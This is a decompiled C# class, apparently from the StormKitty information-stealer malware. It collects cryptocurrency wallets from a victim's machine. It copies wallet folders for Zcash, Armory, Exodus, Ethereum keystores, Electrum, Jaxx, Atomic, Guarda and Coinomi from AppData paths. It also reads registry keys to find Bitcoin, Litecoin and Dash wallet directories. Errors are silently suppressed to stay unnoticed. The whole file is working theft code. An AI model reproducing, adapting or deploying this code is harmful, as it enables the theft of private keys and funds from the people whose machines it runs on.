using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using StormKitty;

namespace Stealer
{
	// Token: 0x02000024 RID: 36
	internal sealed class Wallets
	{
		// Token: 0x060000AE RID: 174 RVA: 0x000065F0 File Offset: 0x000047F0
		public static void GetWallets(string sSaveDir)
		{
			try
			{
				Directory.CreateDirectory(sSaveDir);
				foreach (string[] array in Wallets.sWalletsDirectories)
				{
					Wallets.CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]);
				}
				foreach (string sWalletRegistry in Wallets.sWalletsRegistry)
				{
					Wallets.CopyWalletFromRegistryTo(sSaveDir, sWalletRegistry);
				}
				if (Counter.Wallets == 0)
				{
					Filemanager.RecursiveDelete(sSaveDir);
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000AF RID: 175 RVA: 0x00006690 File Offset: 0x00004890
		private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
		{
			string destFolder = Path.Combine(sSaveDir, sWalletName);
			if (Directory.Exists(sWalletDir))
			{
				Filemanager.CopyDirectory(sWalletDir, destFolder);
				Counter.Wallets++;
			}
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x000066C4 File Offset: 0x000048C4
		private static void CopyWalletFromRegistryTo(string sSaveDir, string sWalletRegistry)
		{
			string destFolder = Path.Combine(sSaveDir, sWalletRegistry);
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey(sWalletRegistry).OpenSubKey(sWalletRegistry + "-Qt"))
				{
					if (registryKey != null)
					{
						string text = registryKey.GetValue("strDataDir").ToString() + "\\wallets";
						if (Directory.Exists(text))
						{
							Filemanager.CopyDirectory(text, destFolder);
							Counter.Wallets++;
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400005A RID: 90
		private static List<string[]> sWalletsDirectories = new List<string[]>
		{
			new string[]
			{
				"Zcash",
				Paths.appdata + "\\Zcash"
			},
			new string[]
			{
				"Armory",
				Paths.appdata + "\\Armory"
			},
			new string[]
			{
				"Bytecoin",
				Paths.appdata + "\\bytecoin"
			},
			new string[]
			{
				"Jaxx",
				Paths.appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"
			},
			new string[]
			{
				"Exodus",
				Paths.appdata + "\\Exodus\\exodus.wallet"
			},
			new string[]
			{
				"Ethereum",
				Paths.appdata + "\\Ethereum\\keystore"
			},
			new string[]
			{
				"Electrum",
				Paths.appdata + "\\Electrum\\wallets"
			},
			new string[]
			{
				"AtomicWallet",
				Paths.appdata + "\\atomic\\Local Storage\\leveldb"
			},
			new string[]
			{
				"Guarda",
				Paths.appdata + "\\Guarda\\Local Storage\\leveldb"
			},
			new string[]
			{
				"Coinomi",
				Paths.lappdata + "\\Coinomi\\Coinomi\\wallets"
			}
		};

		// Token: 0x0400005B RID: 91
		private static string[] sWalletsRegistry = new string[]
		{
			"Litecoin",
			"Dash",
			"Bitcoin"
		};
	}
}
